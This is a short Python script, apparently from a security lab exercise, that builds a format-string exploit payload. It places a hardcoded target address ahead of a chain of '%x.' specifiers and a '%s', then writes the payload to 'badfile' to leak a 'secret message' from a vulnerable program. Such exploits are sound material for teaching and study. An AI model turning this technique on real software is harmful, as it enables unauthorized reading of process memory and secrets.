#!/usr/bin/python3
import sys

N = 1500

# Initialize payload with 1500 bytes
# content = bytearray(0x0 for _ in range(N))

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

offset=4

# Address of the secret message
secret_msg_addr = 0x080af014
content[0:offset]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
print(content[0:4])
exit

# This line shows how to construct a string s with
s = "%x." * 65 + "%s"
fmt = s.encode('latin-1')

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[offset:offset+len(fmt)] = fmt

# Write payload to badfile
with open('badfile', 'wb') as f:
    f.write(content)

# Output payload for testing
sys.stdout.buffer.write(content)
